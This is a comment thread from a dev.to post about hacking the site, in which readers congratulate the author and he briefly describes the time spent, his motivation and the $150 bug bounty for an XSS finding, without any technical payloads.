[ ![sl0badob profile image](https://media2.dev.to/dynamic/image/width=50,height=50,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F98308%2F075c7301-bf95-4ec2-a657-64c015f44b15.png) ](https://dev.to/sl0badob)

[ sl0badob  ](https://dev.to/sl0badob)

sl0badob 

[ ![](https://media2.dev.to/dynamic/image/width=90,height=90,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F98308%2F075c7301-bf95-4ec2-a657-64c015f44b15.png) sl0badob  ](/sl0badob)

Follow

  * Joined 

Sep 4, 2018

• [ Sep 4 '18  ](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-58n9)

  * [Copy link](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-58n9)
  *  * Hide 
  *  *  * 

Great info and writeup! Thank you for sharing. I have to ask a few questions if you wouldnt mind answering. How much time did you spend on this? What is your primary motivation; curiosity, cash, just because? Was the meager $150 reward worth you efforts? 

1 like Like  Reply

[ ![antogarand profile image](https://media2.dev.to/dynamic/image/width=50,height=50,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F77692%2F42cc26a2-feb1-42cc-9dbe-7df4f85f9e48.jpg) ](https://dev.to/antogarand)

[ Antony Garand  ](https://dev.to/antogarand)

Antony Garand 

[ ![](https://media2.dev.to/dynamic/image/width=90,height=90,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F77692%2F42cc26a2-feb1-42cc-9dbe-7df4f85f9e48.jpg) Antony Garand  ](/antogarand)

Follow

Security enthusiast, FullStack developer, challenge solver 

  * Joined 

Jun 9, 2018

• [ Sep 4 '18  ](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-592a)

  * [Copy link](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-592a)
  *  * Hide 
  *  *  * 

I found the initial XSS within 15 minutes, but the variations and bypasses took few hours.

The primary motivation is to make the internet more secure, and fun part of breaking websites. The challenges and the reward of having an `alert` is fun.

The 150$ reward is plenty, I'm doing this for fun, and I like this website, so having a reward is only a nice bonus.

3 likes Like  Reply

[ ![math2001 profile image](https://media2.dev.to/dynamic/image/width=50,height=50,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F17319%2F36a49a5c-76ea-48ff-9e67-e18e143057ad.png) ](https://dev.to/math2001)

[ Mathieu PATUREL  ](https://dev.to/math2001)

Mathieu PATUREL 

[ ![](https://media2.dev.to/dynamic/image/width=90,height=90,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F17319%2F36a49a5c-76ea-48ff-9e67-e18e143057ad.png) Mathieu PATUREL  ](/math2001)

Follow

Don't have much inspiration for an original bio right now... 

  * Email 

[australie.p@gmail.com](mailto:australie.p@gmail.com)

  * Location 

Australia 

  * Education 

self taught 

  * Joined 

Apr 23, 2017

• [ Aug 31 '18  ](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-56db)

  * [Copy link](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-56db)
  *  * Hide 
  *  *  * 

Nice! This is really awesome!

3 likes Like  Reply

[ ![rhymes profile image](https://media2.dev.to/dynamic/image/width=50,height=50,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F2693%2Fbfd9a4a5-92b3-4ac3-a276-3ccb68d78203.jpg) ](https://dev.to/rhymes)

[ rhymes  ](https://dev.to/rhymes)

rhymes 

[ ![](https://media2.dev.to/dynamic/image/width=90,height=90,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F2693%2Fbfd9a4a5-92b3-4ac3-a276-3ccb68d78203.jpg) rhymes  ](/rhymes)

Follow

Such software as dreams are made on. I mostly rant about performance, unnecessary complexity, privacy and data collection. 

  * Joined 

Feb 2, 2017

• [ Aug 31 '18  ](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-56dh)

  * [Copy link](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-56dh)
  *  * Hide 
  *  *  * 

Great job Antony and thanks for the detailed explanation!

2 likes Like  Reply

[ ![joshcheek profile image](https://media2.dev.to/dynamic/image/width=50,height=50,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F707%2F77495.jpeg) ](https://dev.to/joshcheek)

[ Josh Cheek  ](https://dev.to/joshcheek)

Josh Cheek 

[ ![](https://media2.dev.to/dynamic/image/width=90,height=90,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F707%2F77495.jpeg) Josh Cheek  ](/joshcheek)

Follow

  * Joined 

Dec 12, 2016

• [ Sep 3 '18  ](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-58fd)

  * [Copy link](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-58fd)
  *  * Hide 
  *  *  * 

Oh wow, I was sweating as I read this! lol.

1 like Like  Reply

[ ![rattanakchea profile image](https://media2.dev.to/dynamic/image/width=50,height=50,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F35651%2Ff9ded142-017e-462b-bfe5-c7ef9335c3d2.jpeg) ](https://dev.to/rattanakchea)

[ Rattanak Chea  ](https://dev.to/rattanakchea)

Rattanak Chea 

[ ![](https://media2.dev.to/dynamic/image/width=90,height=90,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F35651%2Ff9ded142-017e-462b-bfe5-c7ef9335c3d2.jpeg) Rattanak Chea  ](/rattanakchea)

Follow

SDE II, full stack engineer 

  * Location 

Seattle 

  * Education 

Computer Science B.S 

  * Work 

Full stack developer 

  * Joined 

Oct 4, 2017

• [ Aug 31 '18  • Edited on Aug 31 • Edited ](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-56n0)

  * [Copy link](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-56n0)
  *  * Hide 
  *  *  * 

If dev.to was not open source, would you still be able to find this discovery? How much more effort? Using different approach? Thanks

1 like Like  Reply

[ ![antogarand profile image](https://media2.dev.to/dynamic/image/width=50,height=50,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F77692%2F42cc26a2-feb1-42cc-9dbe-7df4f85f9e48.jpg) ](https://dev.to/antogarand)

[ Antony Garand  ](https://dev.to/antogarand)

Antony Garand 

[ ![](https://media2.dev.to/dynamic/image/width=90,height=90,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F77692%2F42cc26a2-feb1-42cc-9dbe-7df4f85f9e48.jpg) Antony Garand  ](/antogarand)

Follow

Security enthusiast, FullStack developer, challenge solver 

  * Joined 

Jun 9, 2018

• [ Aug 31 '18  ](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-56n3)

  * [Copy link](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-56n3)
  *  * Hide 
  *  *  * 

Without the website being open source, I would have to perform a _black box_ audit, and finding those vulnerabilities is definitely possible but might require more time.

2 likes Like  Reply

[ ![ajitkamath profile image](https://media2.dev.to/dynamic/image/width=50,height=50,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F84114%2F0f02c855-9a7a-4500-92db-33f77e854799.png) ](https://dev.to/ajitkamath)

[ Ajit Kamath  ](https://dev.to/ajitkamath)

Ajit Kamath 

[ ![](https://media2.dev.to/dynamic/image/width=90,height=90,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F84114%2F0f02c855-9a7a-4500-92db-33f77e854799.png) Ajit Kamath  ](/ajitkamath)

Follow

  * Joined 

Jul 12, 2018

• [ Aug 31 '18  ](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-56ka)

  * [Copy link](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-56ka)
  *  * Hide 
  *  *  * 

Brilliant catch !!

1 like Like  Reply

[ View full discussion (22 comments) ](/antogarand/pwned-together-hacking-devto-hkd/comments)

[Code of Conduct](/code-of-conduct) • [Report abuse](/report-abuse)

Are you sure you want to hide this comment? It will become hidden in your post, but will still be visible via the comment's permalink. 

Hide child comments as well

Confirm 

For further actions, you may consider blocking this person and/or [reporting abuse](/report-abuse)
